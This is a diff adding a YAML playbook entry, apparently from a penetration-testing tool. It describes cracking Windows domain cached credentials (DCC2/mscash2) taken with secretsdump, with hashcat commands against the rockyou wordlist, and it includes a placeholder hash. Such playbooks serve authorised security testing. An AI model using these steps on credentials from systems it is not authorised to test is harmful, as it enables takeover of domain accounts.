@@ -1,0 +1,30 @@
+chain_id: dcc2_crack
+title: "Crack Domain Cached Credentials (DCC2 / mscash2) — hashcat -m 2100"
+severity: HIGH
+tags: [crypto, ad, dcc2, mscash2, hashcat, secretsdump]
+
+trigger:
+  any_of:
+    - { kind: dcc2 }
+
+description: |
+  $DCC2$ hash captured (typical from impacket-secretsdump after dumping
+  a domain-joined Windows host's LSA / SECURITY hive). DCC2 is mscash2.
+  These are domain credentials cached for offline logon — cracking them
+  yields a working domain account.
+
+steps:
+  - id: 1
+    title: "Save the hash exactly as secretsdump emitted it"
+    command: echo '$DCC2$10240#alice#abcdef0123456789abcdef0123456789' > dcc2.hash
+
+  - id: 2
+    title: "Crack with hashcat"
+    command: hashcat -m 2100 -a 0 dcc2.hash /usr/share/wordlists/rockyou.txt
+
+  - id: 3
+    title: "Show the result"
+    command: hashcat -m 2100 dcc2.hash --show
+
+references:
+  - https://hashcat.net/wiki/doku.php?id=example_hashes
